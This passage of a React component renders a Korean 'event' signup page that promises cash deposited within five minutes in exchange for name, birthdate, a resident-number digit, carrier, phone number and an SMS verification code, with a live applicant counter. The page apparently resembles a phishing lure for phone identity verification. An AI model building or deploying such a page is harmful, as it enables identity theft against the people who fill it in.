              <div style={{ marginTop: 16, padding: "14px 16px", background: BLUE_06, borderRadius: 10, border: `1px solid ${BLUE_10}`, display: "flex", gap: 10, alignItems: "flex-start" }}>
                <span style={{ fontSize: 15, flexShrink: 0, marginTop: 1 }}>ℹ️</span>
                <div style={{ fontSize: 12.5, color: "#6B7684", lineHeight: 1.8 }}>
                  인증번호 입력 시간은 <span style={{ color: BLUE, fontWeight: 700 }}>3분</span>입니다.<br />
                  문자 수신이 늦어지는 경우 <span style={{ color: BLUE, fontWeight: 700 }}>최대 1분</span>까지 소요될 수 있습니다.
                </div>
              </div>
            </div>
          </div>
        </FadeIn>
      </div>
    );
  }

  /* ── Step 3: 완료 화면 ── */
  if (vDone) {
    return (
      <div style={{ minHeight: "100vh", background: "transparent", fontFamily: "'Noto Sans KR', 'Apple SD Gothic Neo', sans-serif" }}>
        <Navbar />
        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", padding: "40px 20px" }}>
          <FadeIn>
            <div style={{ ...card, maxWidth: 360, width: "100%", padding: "56px 32px", textAlign: "center" }}>
              <div style={{ width: 64, height: 64, borderRadius: "50%", background: BLUE_10, display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 24px" }}>
                <Check size={28} color={BLUE} strokeWidth={2.5} />
              </div>
              <div style={{ fontSize: 24, fontWeight: 900, color: BLUE, marginBottom: 12, letterSpacing: "-0.03em" }}>접수 완료</div>
              <div style={{ fontSize: 15, color: BLUE_40, lineHeight: 1.8 }}>
                이벤트 참여 접수가 완료되었습니다.<br />빠른 시간 내에 입금 처리해드리겠습니다.
              </div>
            </div>
          </FadeIn>
        </div>
      </div>
    );
  }

  /* ── Step 1: 이벤트 배너 + 인증 폼 ── */
  return (
    <div style={{ minHeight: "100vh", background: "transparent", color: BLUE, fontFamily: "'Noto Sans KR', 'Apple SD Gothic Neo', sans-serif" }}>
      <Navbar />

      {settings?.heroImagePath && (
        <div className="wave-hero" data-testid="hero-image-blend">
          <img
            src={`/api/site/hero-image?v=${encodeURIComponent(settings.heroImagePath)}`}
            alt={settings.heroImageAlt || ""}
            fetchPriority="high"
          />
        </div>
      )}

      {/* ── 절차 안내 섹션 ── */}
      <div style={{ padding: isMobile ? "56px 20px" : "80px 24px" }}>
        <div style={{ maxWidth: 720, margin: "0 auto" }}>
          <Reveal direction="up" delay={0}>
            <div style={{ textAlign: "center", marginBottom: 52 }}>
              <span className="wave-label" style={{ display: "inline-block", fontSize: 11, fontWeight: 800, letterSpacing: "0.12em", borderRadius: 99, padding: "5px 16px", marginBottom: 18 }}>HOW IT WORKS</span>
              <h2 className="wave-heading" style={{ margin: 0, fontSize: isMobile ? 24 : 32, fontWeight: 900, letterSpacing: "-0.04em", lineHeight: 1.25 }}>
                3단계로 끝나는<br />간편 이벤트 신청
              </h2>
            </div>
          </Reveal>

          <div style={{ display: "grid", gridTemplateColumns: isMobile ? "1fr" : "1fr 1fr 1fr", gap: isMobile ? 20 : 24, position: "relative", alignItems: "stretch" }}>
            {[
              { step: "01", SvgIcon: IconForm,  title: "정보 입력", desc: "이름, 생년월일,\n통신사·휴대폰 번호를\n입력합니다", grad: "linear-gradient(135deg, #E8F1FF 0%, #D6E8FF 100%)", iconBg: "linear-gradient(135deg, #4A9EFF 0%, #3182F6 100%)", glow: "rgba(49,130,246,0.35)" },
              { step: "02", SvgIcon: IconLock,  title: "문자 인증", desc: "발송된 인증번호\n6자리를 입력해\n본인 확인을 완료합니다", grad: "linear-gradient(135deg, #EDE8FF 0%, #DDD6FF 100%)", iconBg: "linear-gradient(135deg, #8B6EFF 0%, #6C47FF 100%)", glow: "rgba(108,71,255,0.35)" },
              { step: "03", SvgIcon: IconMoney, title: "혜택 지급", desc: "이벤트 참여 후\n5분 이내로 본인 계좌로\n즉시 입금됩니다", grad: "linear-gradient(135deg, #E8FFF4 0%, #D6FFE8 100%)", iconBg: "linear-gradient(135deg, #34D37A 0%, #10B865 100%)", glow: "rgba(16,184,101,0.35)" },
            ].map(({ step, SvgIcon, title, desc, grad, iconBg, glow }, i) => (
              <Reveal key={step} direction="up" delay={i * 0.12}>
                <div className="wave-surface" style={{
                  borderRadius: 20,
                  padding: "32px 24px 28px",
                  textAlign: "center",
                  position: "relative",
                  boxShadow: "0 2px 0 0 rgba(49,130,246,0.08), 0 8px 32px rgba(49,130,246,0.10), 0 24px 64px rgba(0,0,0,0.06)",
                  border: "1px solid rgba(255,255,255,0.9)",
                  overflow: "hidden",
                  height: "100%",
                  boxSizing: "border-box" as const,
                }}>
                  {/* 카드 상단 컬러 스트립 */}
                  <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 3, background: iconBg, borderRadius: "20px 20px 0 0" }} />
                  {/* 배경 그라디언트 서클 */}
                  <div style={{ position: "absolute", top: -40, right: -40, width: 140, height: 140, borderRadius: "50%", background: grad, opacity: 0.5 }} />

                  {/* 스텝 번호 */}
                  <div style={{ fontSize: 10, fontWeight: 900, color: "rgba(49,130,246,0.4)", letterSpacing: "0.12em", marginBottom: 16, marginTop: 8 }}>STEP {step}</div>

                  {/* 아이콘 컨테이너 — 입체 원형 */}
                  <div style={{
                    width: 72, height: 72,
                    borderRadius: "50%",
                    background: iconBg,
                    margin: "0 auto 20px",
                    display: "flex", alignItems: "center", justifyContent: "center",
                    boxShadow: `0 6px 20px ${glow}, 0 2px 6px rgba(0,0,0,0.12), inset 0 1px 0 rgba(255,255,255,0.35), inset 0 -2px 4px rgba(0,0,0,0.10)`,
                    position: "relative",
                  }}>
                    {/* 상단 하이라이트 */}
                    <div style={{ position: "absolute", top: 6, left: "50%", transform: "translateX(-50%)", width: 36, height: 14, borderRadius: 99, background: "rgba(255,255,255,0.30)", filter: "blur(2px)" }} />
                    <SvgIcon />
                  </div>

                  <div style={{ fontSize: 17, fontWeight: 900, color: "#0D1B2E", marginBottom: 10, letterSpacing: "-0.03em" }}>{title}</div>
                  <div style={{ fontSize: 13, color: "#8492A6", lineHeight: 1.8, whiteSpace: "pre-line" }}>{desc}</div>

                  {/* 연결 화살표 */}
                  {!isMobile && i < 2 && (
                    <div style={{
                      position: "absolute", right: -14, top: "50%", transform: "translateY(-50%)",
                      width: 28, height: 28, borderRadius: "50%",
                      background: WHITE,
                      boxShadow: "0 2px 12px rgba(49,130,246,0.18)",
                      display: "flex", alignItems: "center", justifyContent: "center",
                      color: BLUE, fontSize: 13, fontWeight: 900, zIndex: 2,
                    }}>›</div>
                  )}
                </div>
              </Reveal>
            ))}
          </div>
        </div>
      </div>

      {/* ── 실시간 신청 현황 섹션 ── */}
      <div style={{ padding: isMobile ? "56px 20px" : "72px 24px" }}>
        <div style={{ maxWidth: 520, margin: "0 auto" }}>
          <Reveal direction="up" delay={0}>
            {/* LIVE 뱃지 */}
            <div style={{ display: "flex", justifyContent: "center", marginBottom: 20 }}>
              <div className="wave-label" style={{ display: "inline-flex", alignItems: "center", gap: 7, borderRadius: 99, padding: "6px 16px" }}>
                <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#4ADE80", display: "inline-block", animation: "pulse 1.8s ease-in-out infinite" }} />
                <span style={{ fontSize: 11, fontWeight: 800, letterSpacing: "0.1em" }}>LIVE</span>
              </div>
            </div>
            <h2 className="wave-heading" style={{ margin: "0 0 32px", fontSize: isMobile ? 20 : 24, fontWeight: 900, letterSpacing: "-0.03em", textAlign: "center" }}>
              실시간 이벤트 신청 현황
            </h2>

            {/* 카운터 카드 — 시안 B */}
            <div className="wave-surface" style={{
              borderRadius: 28,
              padding: isMobile ? "40px 28px 36px" : "52px 52px 44px",
              textAlign: "center",
              boxShadow: "6px 12px 0 rgba(49,130,246,0.18), 0 24px 56px rgba(49,130,246,0.12), 0 4px 12px rgba(0,0,0,0.05)",
              border: "1px solid rgba(49,130,246,0.10)",
              position: "relative",
              overflow: "hidden",
            }}>
              {/* 상단 파란 스트립 */}
              <div style={{ position: "absolute", top: 0, left: 0, right: 0, height: 4, background: BLUE, borderRadius: "28px 28px 0 0" }} />

              <div style={{ fontSize: 11, fontWeight: 700, color: "#94A3B8", letterSpacing: "0.1em", marginBottom: 20, textTransform: "uppercase" as const }}>누적 신청 건수</div>

              {/* 숫자 */}
              <div style={{ display: "flex", alignItems: "baseline", justifyContent: "center", gap: 6, marginBottom: 6 }}>
                <span style={{
                  fontSize: isMobile ? 60 : 76,
                  fontWeight: 900,
                  color: BLUE,
                  letterSpacing: "-0.04em",
                  lineHeight: 1,
                  fontVariantNumeric: "tabular-nums",
                  transition: "all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1)",
                }}>
                  {liveCount > 0 ? liveCount.toLocaleString() : "—"}
                </span>
                <span style={{ fontSize: 20, fontWeight: 700, color: "#CBD5E1" }}>명</span>
              </div>

              {/* 진행 바 */}
              <div style={{ margin: "28px 0 14px", background: "rgba(49,130,246,0.08)", borderRadius: 99, height: 7, overflow: "hidden" }}>
                <div style={{
                  height: "100%", borderRadius: 99,
                  background: BLUE,
                  width: liveCount > 0 ? `${Math.min(100, (liveCount / 5000) * 100)}%` : "0%",
                  transition: "width 0.8s cubic-bezier(0.34, 1.56, 0.64, 1)",
                  boxShadow: "0 0 10px rgba(49,130,246,0.4)",
                }} />
              </div>
              <div style={{ fontSize: 11, color: "#CBD5E1", letterSpacing: "0.04em" }}>
                목표 5,000명을 향해 달려가는 중
              </div>
            </div>
          </Reveal>
        </div>
      </div>


      {/* ② 인증 폼 (스크롤) */}
      <div id="form-section" ref={formRef} className="wave-form-section" style={{ display: "flex", alignItems: "center", justifyContent: "center", padding: "48px 20px 64px" }}>
        <div style={{ width: "100%", maxWidth: 400 }}>
          <Reveal direction="up" delay={0}>
            <div style={{ ...card, padding: "32px 28px" }}>
              <div style={{ marginBottom: 28 }}>
                <div style={{ fontSize: 12, fontWeight: 700, color: BLUE, letterSpacing: "0.04em", marginBottom: 8, opacity: 0.6, whiteSpace: "pre-line" }}>
                  {c.formSubtitle}
                </div>
                <h1 style={{ margin: 0, fontSize: 24, fontWeight: 900, color: BLUE, letterSpacing: "-0.04em", lineHeight: 1.25, whiteSpace: "pre-line" }}>
                  {c.formTitle}
                </h1>
              </div>

              <div style={{ display: "flex", flexDirection: "column", gap: 12, marginBottom: 20 }}>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 600, color: BLUE, opacity: 0.5, marginBottom: 6 }}>이름</div>
                  <Input placeholder="이름을 입력해주세요" value={vName} onChange={setVName} />
                </div>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 600, color: BLUE, opacity: 0.5, marginBottom: 6 }}>생년월일 / 주민번호</div>
                  <div style={{ display: "flex", alignItems: "center", gap: isMobile ? 6 : 8 }}>
                    <Input placeholder="생년월일 6자리" value={vBirth} onChange={(v) => setVBirth(v.replace(/\D/g, "").slice(0, 6))} maxLength={6} style={{ flex: 1, minWidth: 0 }} />
                    <span style={{ color: BLUE_25, fontWeight: 700, fontSize: 18, flexShrink: 0 }}>—</span>
                    <Input placeholder="0" value={vGender} onChange={(v) => setVGender(v.replace(/\D/g, "").slice(0, 1))} maxLength={1} style={{ width: isMobile ? 36 : 44, textAlign: "center", padding: "14px 4px", flexShrink: 0 }} />
                    {!isMobile && (
                      <div style={{ display: "flex", gap: 5, flexShrink: 0 }}>
                        {[...Array(6)].map((_, i) => <div key={i} style={{ width: 7, height: 7, borderRadius: "50%", background: BLUE_15 }} />)}
                      </div>
                    )}
                  </div>
                </div>
                <div>
                  <div style={{ fontSize: 12, fontWeight: 600, color: BLUE, opacity: 0.5, marginBottom: 6 }}>통신사 / 휴대폰 번호</div>
                  <div style={{ display: "flex", gap: 8 }}>
                    <Select value={vCarrier} onChange={setVCarrier} placeholder="통신사" options={carriers} style={{ width: 136, flexShrink: 0 }} />
                    <Input placeholder="휴대폰 번호" value={vPhone} onChange={(v) => setVPhone(v.replace(/\D/g, "").slice(0, 11))} type="tel" style={{ flex: 1 }} />
                  </div>
                </div>
              </div>

              <div style={{ border: `1px solid ${BLUE_15}`, borderRadius: RADIUS, overflow: "hidden", marginBottom: 20 }}>
                <div onClick={() => toggleAll(!agreeAll)} style={{ display: "flex", alignItems: "center", gap: 12, padding: "14px 16px", borderBottom: `1px solid ${BLUE_10}`, cursor: "pointer", background: agreeAll ? BLUE_06 : WHITE, transition: "background 0.15s" }}>
                  <Checkbox checked={agreeAll} onClick={() => toggleAll(!agreeAll)} />
                  <span style={{ fontSize: 14, fontWeight: 700, color: BLUE }}>필수 약관에 모두 동의</span>
                </div>
                {[
                  { checked: agreePhone,   toggle: () => setAgreePhone(!agreePhone),   label: "휴대폰 본인확인 서비스 약관동의" },
                  { checked: agreePrivacy, toggle: () => setAgreePrivacy(!agreePrivacy), label: "개인정보 수집·이용 동의 (본인확인)" },
                ].map((item, i) => (
                  <div key={i} onClick={item.toggle} style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "12px 16px", borderBottom: i === 0 ? `1px solid ${BLUE_10}` : "none", cursor: "pointer", background: WHITE }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                      <Checkbox checked={item.checked} onClick={item.toggle} />
                      <span style={{ fontSize: 13, color: "#1a1a1a" }}>{item.label}</span>
                    </div>
                    <ChevronRight size={14} style={{ color: BLUE_25, flexShrink: 0 }} />
                  </div>
                ))}
              </div>

              <Btn onClick={handleSend} disabled={!agreePhone || !agreePrivacy} loading={verifyStart.isPending}>
                인증번호 받기
              </Btn>

              <p style={{ marginTop: 16, fontSize: 11, color: "#1a1a1a", lineHeight: 1.7, textAlign: "center" }}>
                {c.formDisclaimer}
              </p>
            </div>
          </Reveal>
        </div>
      </div>
    </div>
  );
}
